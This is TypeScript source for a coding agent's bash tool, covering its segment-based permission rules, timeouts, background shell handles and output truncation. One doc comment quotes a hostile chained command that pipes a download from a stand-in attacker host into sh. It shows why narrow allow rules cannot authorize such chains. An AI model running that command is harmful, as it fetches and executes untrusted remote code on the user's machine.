import { constants } from "node:fs";
import { access as fsAccess } from "node:fs/promises";
import { type AgentTool, type AgentToolResult, ToolExecutionError } from "apex-code-agent-core";
import { spawn } from "child_process";
import { type Static, Type } from "typebox";
import { waitForChildProcess } from "../../utils/child-process.ts";
import {
	getShellConfig,
	getShellEnv,
	killProcessTree,
	type ShellConfig,
	trackDetachedChildPid,
	untrackDetachedChildPid,
} from "../../utils/shell.ts";
import { setApexEnvironment } from "../environment.ts";
import { getExperimentalToolSampling } from "../experimental.ts";
import type { ExtensionContext } from "../extensions/types.ts";
import { type BackgroundShellRegistry, createBackgroundShellRegistry } from "./background-shell.ts";
import { classifyBashCommand } from "./bash-command-segments.ts";
import { type ApexToolDefinition, type PermissionSpec, toolUnion } from "./contract.ts";
import { OutputAccumulator } from "./output-accumulator.ts";
import { BASH_UPDATE_THROTTLE_MS, createShellRenderers } from "./renderers/bash.ts";
import { parseShellOperation } from "./shell-operation.ts";
import { wrapToolDefinition } from "./tool-definition-wrapper.ts";
import { DEFAULT_MAX_BYTES, DEFAULT_MAX_LINES, formatSize, type TruncationResult } from "./truncate.ts";

const MAX_TIMEOUT_MS = 2_147_483_647;
const MAX_TIMEOUT_SECONDS = MAX_TIMEOUT_MS / 1000;

/**
 * Applied when a call names no `timeout`. One hour, which is 2.16x the slowest full suite run
 * recorded for this repository on the host ADR 0035 names. A default that merely cleared the
 * measurement would kill a real build on a slower machine, and a killed build presents as a
 * failing build rather than as a timeout, which is the expensive mistake.
 */
export const DEFAULT_BASH_TIMEOUT_SECONDS = 3600;

function resolveTimeoutMs(timeout: number | undefined): number {
	if (timeout === undefined) return DEFAULT_BASH_TIMEOUT_SECONDS * 1000;
	if (!Number.isFinite(timeout) || timeout <= 0) {
		throw new Error("Invalid timeout: must be a finite number of seconds");
	}

	const timeoutMs = timeout * 1000;
	if (timeoutMs > MAX_TIMEOUT_MS) {
		throw new Error(`Invalid timeout: maximum is ${MAX_TIMEOUT_SECONDS} seconds`);
	}
	return timeoutMs;
}

const bashSchemaProperties = {
	command: Type.String({ description: "Shell command to execute" }),
	timeout: Type.Optional(
		Type.Number({
			description: `Timeout in seconds (default ${DEFAULT_BASH_TIMEOUT_SECONDS}; use background for longer work)`,
		}),
	),
	background: Type.Optional(
		Type.Boolean({
			description:
				"Run in the background and return a handle immediately. Retrieve with { handle }; kill with { handle, kill: true }.",
		}),
	),
	handle: Type.String({
		description:
			"Handle from a background launch. Supply it alone to retrieve output and status; add kill: true to terminate.",
	}),
	kill: Type.Boolean({
		description: "Set to true only with a background handle to terminate its command; otherwise omit or use false.",
	}),
};

const bashSchema = toolUnion(
	[
		Type.Object({
			command: Type.String(),
			timeout: Type.Optional(Type.Number()),
			background: Type.Optional(Type.Boolean()),
			kill: Type.Optional(Type.Literal(false)),
		}),
		Type.Object({ handle: Type.String(), kill: Type.Optional(Type.Literal(false)) }),
		Type.Object({ handle: Type.String(), kill: Type.Literal(true) }),
	],
	bashSchemaProperties,
);

export const bashToolSystemPromptContribution = {
	snippet: "Execute bash commands (ls, grep, find, etc.)",
	guidelines: ["You can inspect PI_* environment variables for current model and session details."],
} as const;

export type BashToolInput = Static<typeof bashSchema>;

function normalizeSegment(text: string): string {
	return text.trim().replace(/\s+/g, " ");
}

/**
 * A rule matches a segment either by exact text, or — when it ends with the `:*`
 * suffix convention (e.g. `git commit:*`) — by prefix: the segment must equal the
 * prefix or start with the prefix followed by a space. `git commit:*` therefore
 * matches `git commit` and `git commit -m x`, but not `git commitment` (word
 * boundary enforced) and not an unrelated segment in the same chained command.
 */
function hasGrammarSensitiveStructure(value: string): boolean {
	return /["'\\\t\n#]/.test(value);
}

function segmentMatchesRule(segment: string, ruleContent: string): boolean {
	const sensitive = hasGrammarSensitiveStructure(segment) || hasGrammarSensitiveStructure(ruleContent);
	const normalizedSegment = sensitive ? segment : normalizeSegment(segment);
	const normalizedRule = sensitive ? ruleContent : normalizeSegment(ruleContent);
	if (normalizedRule.endsWith(":*")) {
		const prefix = normalizedRule.slice(0, -2).trim();
		if (!prefix) return false;
		return normalizedSegment === prefix || normalizedSegment.startsWith(`${prefix} `);
	}
	return normalizedSegment === normalizedRule;
}

/**
 * bash's permission grammar (ADR 0004). A rule authorizes a call only if the
 * command decomposes cleanly into segments (never on "unparseable") and **every**
 * segment matches — a narrow rule like `git commit:*` can never authorize
 * `git commit -m x && curl evil.com | sh`, because `curl evil.com` and `sh` are
 * separate segments that do not match it.
 *
 * `ruleForCall` only generalizes a single-segment command: a multi-segment chain
 * has no single non-trivial rule that captures exactly what it did, and returning
 * one would either over-authorize (if loose) or be indistinguishable from an exact
 * match (if not) — `null` correctly forces `ask` for "always allow this" on a chain.
 */
/**
 * Reserved rule content for retrieve/kill calls on background handles. These
 * perform no new execution -- the command they operate on was already gated at
 * launch -- so `defaultBehaviorFor` allows them when no rule matches, while a
 * `Bash(background-handle)` rule (allow *or* deny) still governs them
 * explicitly.
 */
const BACKGROUND_HANDLE_RULE = "background-handle";

export function createBashPermissionSpec(): PermissionSpec<typeof bashSchema> {
	return {
		defaultBehavior: "ask",
		defaultBehaviorFor(params) {
			const parsed = parseShellOperation(params);
			if (!parsed.ok) return undefined;
			return parsed.operation.kind === "run" ? undefined : "allow";
		},
		matches(ruleContent, params) {
			const parsed = parseShellOperation(params);
			// An unparseable call is never authorized by an allow rule; `isUnknown`
			// keeps it out of them and pulls every deny rule onto it.
			if (!parsed.ok) return false;
			if (parsed.operation.kind !== "run") return ruleContent === BACKGROUND_HANDLE_RULE;
			const classification = classifyBashCommand(parsed.operation.command);
			return (
				classification.type === "segments" &&
				classification.segments.every((segment) => segmentMatchesRule(segment, ruleContent))
			);
		},
		matchesDeny(ruleContent, params) {
			const parsed = parseShellOperation(params);
			if (!parsed.ok) return false;
			if (parsed.operation.kind !== "run") return ruleContent === BACKGROUND_HANDLE_RULE;
			const classification = classifyBashCommand(parsed.operation.command);
			return (
				classification.type === "segments" &&
				classification.segments.some((segment) => segmentMatchesRule(segment, ruleContent))
			);
		},
		isUnknown(params) {
			const parsed = parseShellOperation(params);
			if (!parsed.ok) return true;
			return parsed.operation.kind === "run" && classifyBashCommand(parsed.operation.command).type !== "segments";
		},
		describe(ruleContent) {
			if (ruleContent === BACKGROUND_HANDLE_RULE) {
				return "Retrieve or kill background shell commands";
			}
			return `Run bash commands matching "${ruleContent}"`;
		},
		previewCall(params) {
			// The command string is the entire effect being authorized. There is
			// nothing to read and nothing to summarise: showing it exactly, including
			// whitespace the rule grammar treats as significant, is the preview.
			const parsed = parseShellOperation(params);
			if (!parsed.ok) return { kind: "summary", lines: [parsed.reason] };
			if (parsed.operation.kind === "kill") {
				return { kind: "summary", lines: [`Kill background shell command ${parsed.operation.handle}`] };
			}
			if (parsed.operation.kind === "retrieve") {
				return {
					kind: "summary",
					lines: [`Retrieve output from background shell command ${parsed.operation.handle}`],
				};
			}
			return { kind: "summary", lines: [parsed.operation.command] };
		},
		ruleForCall(params) {
			const parsed = parseShellOperation(params);
			if (!parsed.ok) return null;
			if (parsed.operation.kind !== "run") {
				return BACKGROUND_HANDLE_RULE;
			}
			const classification = classifyBashCommand(parsed.operation.command);
			if (classification.type !== "segments" || classification.segments.length !== 1) return null;
			const segment = classification.segments[0];
			return hasGrammarSensitiveStructure(segment) ? segment : normalizeSegment(segment);
		},
	};
}

export interface BashExecutionFacts {
	cwd: string;
	executable?: string;
	argv?: string[];
	exitCode: number | null;
}

export interface BashToolDetails {
	truncation?: TruncationResult;
	fullOutputPath?: string;
	/** Facts observed at the source execution boundary; never rendered as output. */
	execution?: BashExecutionFacts;
}

/**
 * Pluggable operations for the bash tool.
 * Override these to delegate command execution to remote systems (for example SSH).
 */
export interface BashOperations {
	/**
	 * Execute a command and stream output.
	 * @param command The command to execute
	 * @param cwd Working directory
	 * @param options Execution options
	 * @returns Promise resolving to exit code (null if killed)
	 */
	exec: (
		command: string,
		cwd: string,
		options: {
			onData: (data: Buffer) => void;
			signal?: AbortSignal;
			timeout?: number;
			env?: NodeJS.ProcessEnv;
		},
	) => Promise<{ exitCode: number | null; executable?: string; argv?: string[] }>;
	/**
	 * Optional. Spawn a command that outlives the call, returning as soon as the
	 * process exists. Backends that cannot background leave this undefined, and
	 * the bash tool then rejects `background: true` with a model-readable error
	 * rather than degrading (spec 2026-08-31-background-shell.md).
	 */
	spawnBackground?: (
		command: string,
		cwd: string,
		options: {
			onData: (data: Buffer) => void;
			env?: NodeJS.ProcessEnv;
		},
	) => Promise<BashBackgroundProcess>;
}

export interface BashBackgroundProcess {
	pid: number | undefined;
	exited: Promise<number | null>;
}

/** Shared process execution used by the built-in shell tools. */
export function createLocalShellOperations(shellName: string, resolveShellConfig: () => ShellConfig): BashOperations {
	return {
		exec: async (command, cwd, { onData, signal, timeout, env }) => {
			const timeoutMs = resolveTimeoutMs(timeout);
			if (signal?.aborted) {
				throw new Error("aborted");
			}
			const shellConfig = resolveShellConfig();
			try {
				await fsAccess(cwd, constants.F_OK);
			} catch {
				throw new Error(`Working directory does not exist: ${cwd}\nCannot execute ${shellName} commands.`);
			}

			const commandFromStdin = shellConfig.commandTransport === "stdin";
			const child = spawn(shellConfig.shell, commandFromStdin ? shellConfig.args : [...shellConfig.args, command], {
				cwd,
				detached: process.platform !== "win32",
				env: env ?? getShellEnv(),
				stdio: [commandFromStdin ? "pipe" : "ignore", "pipe", "pipe"],
				windowsHide: true,
			});
			if (commandFromStdin) {
				child.stdin?.on("error", () => {});
				child.stdin?.end(command);
			}
			if (child.pid) trackDetachedChildPid(child.pid);
			let timedOut = false;
			let timeoutHandle: NodeJS.Timeout | undefined;
			const onAbort = () => {
				if (child.pid) killProcessTree(child.pid);
			};

			try {
				timeoutHandle = setTimeout(() => {
					timedOut = true;
					if (child.pid) killProcessTree(child.pid);
				}, timeoutMs);
				// Stream stdout and stderr.
				child.stdout?.on("data", onData);
				child.stderr?.on("data", onData);
				// Handle abort signal by killing the entire process tree.
				if (signal) {
					if (signal.aborted) onAbort();
					else signal.addEventListener("abort", onAbort, { once: true });
				}
				// Handle shell spawn errors and wait for the process to terminate without hanging
				// on inherited stdio handles held by detached descendants.
				const exitCode = await waitForChildProcess(child);
				if (signal?.aborted) {
					throw new Error("aborted");
				}
				if (timedOut) {
					throw new Error(`timeout:${timeoutMs / 1000}`);
				}
				return {
					exitCode,
					executable: shellConfig.shell,
					argv: commandFromStdin ? [...shellConfig.args] : [...shellConfig.args, command],
				};
			} finally {
				if (child.pid) untrackDetachedChildPid(child.pid);
				if (timeoutHandle) clearTimeout(timeoutHandle);
				if (signal) signal.removeEventListener("abort", onAbort);
			}
		},
		spawnBackground: async (command, cwd, { onData, env }) => {
			const shellConfig = resolveShellConfig();
			try {
				await fsAccess(cwd, constants.F_OK);
			} catch {
				throw new Error(`Working directory does not exist: ${cwd}\nCannot execute ${shellName} commands.`);
			}
			const commandFromStdin = shellConfig.commandTransport === "stdin";
			const child = spawn(shellConfig.shell, commandFromStdin ? shellConfig.args : [...shellConfig.args, command], {
				cwd,
				detached: process.platform !== "win32",
				env: env ?? getShellEnv(),
				stdio: [commandFromStdin ? "pipe" : "ignore", "pipe", "pipe"],
				windowsHide: true,
			});
			if (commandFromStdin) {
				child.stdin?.on("error", () => {});
				child.stdin?.end(command);
			}
			if (child.pid) trackDetachedChildPid(child.pid);
			child.stdout?.on("data", onData);
			child.stderr?.on("data", onData);
			const exited = waitForChildProcess(child).finally(() => {
				if (child.pid) untrackDetachedChildPid(child.pid);
			});
			return { pid: child.pid, exited };
		},
	};
}

/**
 * Create bash operations using pi's built-in local shell execution backend.
 *
 * This is useful for extensions that intercept user_bash and still want pi's
 * standard local shell behavior while wrapping or rewriting commands.
 */
export function createLocalBashOperations(options?: { shellPath?: string }): BashOperations {
	return createLocalShellOperations("bash", () => getShellConfig(options?.shellPath));
}

export interface BashSpawnContext {
	command: string;
	cwd: string;
	env: NodeJS.ProcessEnv;
}

export type BashSpawnHook = (context: BashSpawnContext) => BashSpawnContext;

function resolveSpawnContext(
	command: string,
	cwd: string,
	spawnHook: BashSpawnHook | undefined,
	exposeSessionEnvironment: boolean,
	ctx: ExtensionContext | undefined,
): BashSpawnContext {
	const env = { ...getShellEnv() };
	setApexEnvironment("APEX_CODE_SESSION_ID", undefined, env);
	setApexEnvironment("APEX_CODE_SESSION_FILE", undefined, env);
	setApexEnvironment("APEX_CODE_PROVIDER", undefined, env);
	setApexEnvironment("APEX_CODE_MODEL", undefined, env);
	setApexEnvironment("APEX_CODE_REASONING_LEVEL", undefined, env);
	if (exposeSessionEnvironment && ctx) {
		const model = ctx.model;
		setApexEnvironment("APEX_CODE_SESSION_ID", ctx.sessionManager.getSessionId(), env);
		const sessionFile = ctx.sessionManager.getSessionFile();
		if (sessionFile) setApexEnvironment("APEX_CODE_SESSION_FILE", sessionFile, env);
		if (model) {
			setApexEnvironment("APEX_CODE_PROVIDER", model.provider, env);
			setApexEnvironment("APEX_CODE_MODEL", model.id, env);
		}
		if (ctx.thinkingLevel) setApexEnvironment("APEX_CODE_REASONING_LEVEL", ctx.thinkingLevel, env);
	}
	const baseContext: BashSpawnContext = { command, cwd, env };
	return spawnHook ? spawnHook(baseContext) : baseContext;
}

export interface BashToolOptions {
	/** Custom operations for command execution. Default: local shell */
	operations?: BashOperations;
	/** Command prefix prepended to every command (for example shell setup commands) */
	commandPrefix?: string;
	/** Optional explicit shell path from settings */
	shellPath?: string;
	/** Expose current Pi session metadata as PI_* environment variables. Default: true */
	exposeSessionEnvironment?: boolean;
	/** Hook to adjust command, cwd, or env before execution */
	spawnHook?: BashSpawnHook;
	/**
	 * Background-shell registry (spec 2026-08-31-background-shell.md). Absent
	 * gets a per-definition registry; the session passes its own so background
	 * children are killed when the session disposes.
	 */
	backgroundRegistry?: BackgroundShellRegistry;
}

/**
 * Re-exported so callers that format a shell call keep importing it from the tool module. The
 * renderer itself lives in `renderers/bash.ts` since upstream split presentation from execution.
 */
export { formatShellCall } from "./renderers/bash.ts";

export interface ShellToolConfig {
	name: string;
	label: string;
	shellName: string;
	prompt: string;
	promptSnippet: string;
	promptGuidelines?: readonly string[];
	tempFilePrefix: string;
}

export function createShellToolDefinition(
	cwd: string,
	config: ShellToolConfig,
	options?: BashToolOptions,
): ApexToolDefinition<typeof bashSchema, BashToolDetails | undefined> {
	const ops = options?.operations ?? createLocalBashOperations({ shellPath: options?.shellPath });
	const commandPrefix = options?.commandPrefix;
	const exposeSessionEnvironment = options?.exposeSessionEnvironment ?? true;
	const spawnHook = options?.spawnHook;
	const registry = options?.backgroundRegistry ?? createBackgroundShellRegistry();

	// Background handle calls (retrieve and kill) never touch the foreground
	// execution path, so the post-hoc escalation offer below is unreachable from
	// them by construction; the refusal note in `executeHandleCall` tells the
	// model a foreground rerun gets the offer (spec, Non-goals).
	const unknownHandleError = (handle: string) => {
		const known = registry.handles();
		return new ToolExecutionError(
			`Unknown background handle: ${handle}.${known.length > 0 ? ` Known handles: ${known.join(", ")}` : " No background commands have been launched."}`,
			undefined,
		);
	};
	const executeHandleCall = async (
		handleInput: { kind: "retrieve"; handle: string } | { kind: "kill"; handle: string },
	): Promise<AgentToolResult<BashToolDetails | undefined>> => {
		if (handleInput.kind === "kill") {
			const status = registry.kill(handleInput.handle);
			if (!status) throw unknownHandleError(handleInput.handle);
			const state = status.running ? "kill signal sent" : `already exited (code ${status.exitCode})`;
			return {
				content: [{ type: "text", text: `[background] ${handleInput.handle}: ${state}` }],
				details: undefined,
			};
		}
		const retrieved = await registry.retrieve(handleInput.handle);
		if (!retrieved) throw unknownHandleError(handleInput.handle);
		const { status, snapshot } = retrieved;
		const elapsed = ((Date.now() - status.startedAt) / 1000).toFixed(1);
		const header = status.running
			? `[background] ${handleInput.handle}: running ${elapsed}s`
			: `[background] ${handleInput.handle}: ${status.killed ? "killed" : "exited"} (code ${status.exitCode}) after ${elapsed}s`;
		let text = `${header}\n\n${snapshot.content || "(no output)"}`;
		const truncation = snapshot.truncation;
		if (truncation.truncated && snapshot.fullOutputPath) {
			const startLine = truncation.totalLines - truncation.outputLines + 1;
			text += `\n\n[Showing lines ${startLine}-${truncation.totalLines} of ${truncation.totalLines}. Full output: ${snapshot.fullOutputPath}]`;
		}
		return {
			content: [{ type: "text", text }],
			details: {
				truncation: truncation.truncated ? truncation : undefined,
				fullOutputPath: snapshot.fullOutputPath,
				execution: { cwd, exitCode: status.exitCode ?? null },
			} satisfies BashToolDetails,
		};
	};
	return {
		name: config.name,
		label: config.label,
		description: `Execute a ${config.shellName} command in the current working directory. Returns stdout and stderr. Output is truncated to last ${DEFAULT_MAX_LINES} lines or ${DEFAULT_MAX_BYTES / 1024}KB (whichever is hit first). If truncated, full output is saved to a temp file. Optionally provide a timeout in seconds; the default is ${DEFAULT_BASH_TIMEOUT_SECONDS}.`,
		promptSnippet: config.promptSnippet,
		promptGuidelines: exposeSessionEnvironment && config.promptGuidelines ? [...config.promptGuidelines] : undefined,
		parameters: bashSchema,
		contract: {
			capabilities: new Set(["exec"]),
			permission: createBashPermissionSpec(),
			context: { resultRecoverable: false, deferSchema: false },
			evidence: {
				emits: new Set(["command"]),
				capture: (params, result) => {
					const execution = result.details?.execution;
					// Retrieve and kill calls carry a handle; resolve it back to the
					// command that produced the output so the record shows what ran.
					const parsed = parseShellOperation(params);
					const command = !parsed.ok
						? "(rejected shell call)"
						: parsed.operation.kind === "run"
							? parsed.operation.command
							: (registry.commandFor(parsed.operation.handle) ?? parsed.operation.handle);
					return execution ? [{ kind: "command", command, ...execution }] : [{ kind: "command", command }];
				},
			},
		},
		constrainedSampling: getExperimentalToolSampling(),
		async execute(_toolCallId, input: BashToolInput, signal?: AbortSignal, onUpdate?, ctx?: ExtensionContext) {
			const parsed = parseShellOperation(input);
			if (!parsed.ok) throw new ToolExecutionError(parsed.reason, undefined);
			if (parsed.operation.kind !== "run") {
				return await executeHandleCall(parsed.operation);
			}
			const { command, timeout, background } = parsed.operation;
			const resolvedCommand = commandPrefix ? `${commandPrefix}\n${command}` : command;
			const spawnContext = resolveSpawnContext(
				resolvedCommand,
				ctx?.cwd || cwd,
				spawnHook,
				exposeSessionEnvironment,
				ctx,
			);

			if (background) {
				const spawnBg = ops.spawnBackground;
				if (!spawnBg) {
					throw new ToolExecutionError(
						"This shell backend does not support background execution. Run the command in the foreground instead.",
						undefined,
					);
				}
				const output = new OutputAccumulator({ tempFilePrefix: config.tempFilePrefix });
				const launched = await spawnBg(spawnContext.command, spawnContext.cwd, {
					env: spawnContext.env,
					onData: (data) => output.append(data),
				});
				const handle = registry.launch({
					command: spawnContext.command,
					pid: launched.pid,
					output,
					exited: launched.exited,
				});
				return {
					content: [
						{
							type: "text",
							text: `[background] launched with handle ${handle}\nRetrieve its output: { "handle": "${handle}" }\nKill it: { "handle": "${handle}", "kill": true }`,
						},
					],
					details: { execution: { cwd: spawnContext.cwd, exitCode: null } },
				};
			}

			const output = new OutputAccumulator({ tempFilePrefix: config.tempFilePrefix });
			let acceptingOutput = true;
			let updateTimer: NodeJS.Timeout | undefined;
			let updateDirty = false;
			let lastUpdateAt = 0;

			const emitOutputUpdate = () => {
				if (!onUpdate || !updateDirty) return;
				updateDirty = false;
				lastUpdateAt = Date.now();
				const snapshot = output.snapshot({ persistIfTruncated: true });
				onUpdate({
					content: [{ type: "text", text: snapshot.content || "" }],
					details: {
						truncation: snapshot.truncation.truncated ? snapshot.truncation : undefined,
						fullOutputPath: snapshot.fullOutputPath,
					},
				});
			};

			const clearUpdateTimer = () => {
				if (updateTimer) {
					clearTimeout(updateTimer);
					updateTimer = undefined;
				}
			};

			const scheduleOutputUpdate = () => {
				if (!onUpdate) return;
				updateDirty = true;
				const delay = BASH_UPDATE_THROTTLE_MS - (Date.now() - lastUpdateAt);
				if (delay <= 0) {
					clearUpdateTimer();
					emitOutputUpdate();
					return;
				}
				updateTimer ??= setTimeout(() => {
					updateTimer = undefined;
					emitOutputUpdate();
				}, delay);
			};

			if (onUpdate) {
				onUpdate({ content: [], details: undefined });
			}

			const handleData = (data: Buffer) => {
				if (!acceptingOutput) return;
				output.append(data);
				scheduleOutputUpdate();
			};

			const finishOutput = async () => {
				acceptingOutput = false;
				output.finish();
				clearUpdateTimer();
				emitOutputUpdate();
				const snapshot = output.snapshot({ persistIfTruncated: true });
				await output.closeTempFile();
				return snapshot;
			};

			const formatOutput = (snapshot: Awaited<ReturnType<typeof finishOutput>>, emptyText = "(no output)") => {
				const truncation = snapshot.truncation;
				let text = snapshot.content || emptyText;
				let details: BashToolDetails | undefined;
				if (truncation.truncated) {
					details = { truncation, fullOutputPath: snapshot.fullOutputPath };
					const startLine = truncation.totalLines - truncation.outputLines + 1;
					const endLine = truncation.totalLines;
					if (truncation.lastLinePartial) {
						const lastLineSize = formatSize(output.getLastLineBytes());
						text += `\n\n[Showing last ${formatSize(truncation.outputBytes)} of line ${endLine} (line is ${lastLineSize}). Full output: ${snapshot.fullOutputPath}]`;
					} else if (truncation.truncatedBy === "lines") {
						text += `\n\n[Showing lines ${startLine}-${endLine} of ${truncation.totalLines}. Full output: ${snapshot.fullOutputPath}]`;
					} else {
						text += `\n\n[Showing lines ${startLine}-${endLine} of ${truncation.totalLines} (${formatSize(DEFAULT_MAX_BYTES)} limit). Full output: ${snapshot.fullOutputPath}]`;
					}
				}
				return { text, details };
			};

			const appendStatus = (text: string, status: string) => `${text ? `${text}\n\n` : ""}${status}`;

			try {
				let exitCode: number | null;
				let execution: BashExecutionFacts;
				try {
					const result = await ops.exec(spawnContext.command, spawnContext.cwd, {
						onData: handleData,
						signal,
						// The default belongs to the tool, not to one backend. Resolved here, every
						// backend gets the effective value; resolved inside the local one, a custom
						// backend silently had no default at all.
						timeout: timeout ?? DEFAULT_BASH_TIMEOUT_SECONDS,
						env: spawnContext.env,
					});
					exitCode = result.exitCode;
					execution = {
						cwd: spawnContext.cwd,
						executable: result.executable,
						argv: result.argv,
						exitCode,
					};
				} catch (err) {
					const snapshot = await finishOutput();
					const { text } = formatOutput(snapshot, "");
					const interruptedExecution: BashExecutionFacts = { cwd: spawnContext.cwd, exitCode: null };
					if (err instanceof Error && err.message === "aborted") {
						throw new ToolExecutionError(appendStatus(text, "Command aborted"), {
							execution: interruptedExecution,
						});
					}
					if (err instanceof Error && err.message.startsWith("timeout:")) {
						const timeoutSecs = err.message.split(":")[1];
						const status = `Command timed out after ${timeoutSecs} seconds. Pass a larger timeout, or run it with background: true and retrieve the output by handle.`;
						throw new ToolExecutionError(appendStatus(text, status), {
							execution: interruptedExecution,
						});
					}
					throw err;
				}

				const snapshot = await finishOutput();
				const { text: outputText, details } = formatOutput(snapshot);
				const resultDetails: BashToolDetails = { ...details, execution };
				if (exitCode !== 0 && exitCode !== null) {
					throw new ToolExecutionError(appendStatus(outputText, `Command exited with code ${exitCode}`), {
						execution,
					});
				}
				return { content: [{ type: "text", text: outputText }], details: resultDetails };
			} finally {
				clearUpdateTimer();
			}
		},
		...createShellRenderers(config.prompt),
	};
}

const bashToolConfig: ShellToolConfig = {
	name: "bash",
	label: "bash",
	shellName: "bash",
	prompt: "$",
	promptSnippet: bashToolSystemPromptContribution.snippet,
	promptGuidelines: bashToolSystemPromptContribution.guidelines,
	tempFilePrefix: "apex-code-bash",
};

export function createBashToolDefinition(
	cwd: string,
	options?: BashToolOptions,
): ApexToolDefinition<typeof bashSchema, BashToolDetails | undefined> {
	return createShellToolDefinition(cwd, bashToolConfig, options);
}

export function createBashTool(cwd: string, options?: BashToolOptions): AgentTool<typeof bashSchema> {
	const definition = createBashToolDefinition(cwd, options);
	const tool = wrapToolDefinition(definition);
	Object.assign(tool, {
		promptSnippet: definition.promptSnippet,
		promptGuidelines: definition.promptGuidelines,
	});
	return tool;
}
